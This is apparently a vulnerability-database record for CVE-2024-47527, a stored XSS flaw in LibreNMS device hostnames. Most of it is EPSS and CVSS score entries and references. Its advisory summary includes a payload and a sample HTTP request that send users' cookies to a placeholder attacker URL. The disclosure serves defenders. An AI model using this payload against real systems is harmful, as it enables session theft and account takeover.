vulnerability_id: VCID-2khw-yzrp-27hc
aliases:
  - CVE-2024-47527
  - GHSA-rwwc-2v8q-gc9v
summary: "LibreNMS has Stored Cross-site Scripting vulnerability in \"Device Dependencies\"\
  \ feature\n### Summary\nA Stored Cross-Site Scripting (XSS) vulnerability in the \"Device\
  \ Dependencies\" feature allows authenticated users to inject arbitrary JavaScript through\
  \ the device name (\"hostname\" parameter). This vulnerability can lead to the execution of\
  \ malicious code in the context of other users' sessions, potentially compromising their accounts\
  \ and allowing unauthorized actions.\n\n### Details\nThe vulnerability occurs when creating\
  \ a device within LibreNMS. An attacker can inject arbitrary JavaScript into the hostname\
  \ parameter. This malicious script is then executed when another user visits the device dependencies\
  \ page, resulting in an automatic redirect to a website controlled by the attacker. This redirect\
  \ can be used to steal session cookies or perform other malicious actions.\n\nFor example,\
  \ the following payload can be used to exploit the vulnerability:\n```t'' autofocus onfocus=\"\
  document.location='https://<attacker_url>/?c='+document.cookie\"```\n\nWhen the device dependencies\
  \ page is loaded, this payload triggers the JavaScript, causing the user's browser to redirect\
  \ to the attacker's website with any non-httponly cookies in the URL.\n\nThe root cause of\
  \ this vulnerability is the application's failure to sanitize the row.hostname value before\
  \ including it in the HTML output. \n\nThis is evident in the following line of code:\nhttps://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/pages/device-dependencies.inc.php#L74\n\
  \n### PoC\n1. Add a new device using the following payload for the hostname:\n```t'' autofocus\
  \ onfocus=\"document.location='https://<attacker_url>/?c='+document.cookie\"```\n2. Save the\
  \ device.\n3. Navigate to the device dependencies page.\n4. Observe that the injected script\
  \ executes, redirecting the user to the attacker's website with any non-httponly cookies included\
  \ in the URL.\n\nExample Request:\n```http\nPOST /addhost HTTP/1.1\nHost: <your_host>\nX-Requested-With:\
  \ XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nCookie:\
  \ <your_cookie>\n\n_token=<your_token>&hostname=t%27%27+autofocus+onfocus%3D%22document.location%3D%27https%3A%2F%<attacker_url>%2F%3Fc%3D%27%2Bdocument.cookie%22&sysName=&hardware=&os=&os_id=&snmpver=v2c&port=&transport=udp&port_assoc_mode=ifIndex&community=&authlevel=noAuthNoPriv&authname=&authpass=&authalgo=SHA&cryptopass=&cryptoalgo=AES&force_add=on&Submit=\n\
  ```\n\n### Impact\nIt could allow authenticated users to execute arbitrary JavaScript code\
  \ in the context of other users' sessions. Impacted users could have their accounts compromised,\
  \ enabling the attacker to perform unauthorized actions on their behalf."
severities:
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.00941'
    published_at: '2025-04-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.0093'
    published_at: '2025-04-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.00936'
    published_at: '2025-04-05 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.00939'
    published_at: '2025-03-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.00935'
    published_at: '2025-04-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.00942'
    published_at: '2025-04-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.0094'
    published_at: '2025-04-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.00937'
    published_at: '2025-04-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.00955'
    published_at: '2025-04-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.00948'
    published_at: '2025-04-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.00947'
    published_at: '2025-04-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00013'
    scoring_system: epss
    scoring_elements: '0.00933'
    published_at: '2025-04-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00031'
    scoring_system: epss
    scoring_elements: '0.04486'
    published_at: '2025-03-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15610'
    published_at: '2024-12-17 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15638'
    published_at: '2024-12-27 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15934'
    published_at: '2025-01-16 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15019'
    published_at: '2024-11-01 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15305'
    published_at: '2024-11-18 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15393'
    published_at: '2024-11-20 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15421'
    published_at: '2024-11-21 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15486'
    published_at: '2024-11-23 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15477'
    published_at: '2024-11-24 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15487'
    published_at: '2024-11-26 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15531'
    published_at: '2024-11-28 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15605'
    published_at: '2024-12-19 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15865'
    published_at: '2024-12-11 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.15917'
    published_at: '2024-12-13 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.16010'
    published_at: '2024-12-15 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: 7e-05
    scoring_system: epss
    scoring_elements: '0.00373'
    published_at: '2025-04-21 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: 7e-05
    scoring_system: epss
    scoring_elements: '0.00374'
    published_at: '2025-04-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: 7e-05
    scoring_system: epss
    scoring_elements: '0.00375'
    published_at: '2025-04-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: 7e-05
    scoring_system: epss
    scoring_elements: '0.00376'
    published_at: '2025-04-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: 7e-05
    scoring_system: epss
    scoring_elements: '0.00371'
    published_at: '2025-04-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: 7e-05
    scoring_system: epss
    scoring_elements: '0.00368'
    published_at: '2025-04-26 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: 7e-05
    scoring_system: epss
    scoring_elements: '0.0037'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: 7e-05
    scoring_system: epss
    scoring_elements: '0.00367'
    published_at: '2025-04-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: 9e-05
    scoring_system: epss
    scoring_elements: '0.00652'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: 9e-05
    scoring_system: epss
    scoring_elements: '0.00658'
    published_at: '2025-04-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
  - score: MODERATE
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-rwwc-2v8q-gc9v
  - score: '6.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://github.com/librenms/librenms
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/pages/device-dependencies.inc.php#L74
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/pages/device-dependencies.inc.php#L74
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/librenms/librenms/commit/36b38a50cc10d4ed16caab92bdc18ed6abac9685
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms/commit/36b38a50cc10d4ed16caab92bdc18ed6abac9685
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-rwwc-2v8q-gc9v
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/librenms/librenms/security/advisories/GHSA-rwwc-2v8q-gc9v
  - score: '5.4'
    scoring_system: cvssv3
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-47527
  - score: '5.4'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-47527
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-47527
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-47527
weaknesses:
  - CWE-79
  - CWE-937
  - CWE-1035
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-47527
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/pages/device-dependencies.inc.php#L74
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/commit/36b38a50cc10d4ed16caab92bdc18ed6abac9685
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/security/advisories/GHSA-rwwc-2v8q-gc9v
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-47527
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:librenms:librenms:*:*:*:*:*:*:*:*
    reference_type:
    reference_id: cpe:2.3:a:librenms:librenms:*:*:*:*:*:*:*:*
  - url: https://github.com/advisories/GHSA-rwwc-2v8q-gc9v
    reference_type:
    reference_id: GHSA-rwwc-2v8q-gc9v
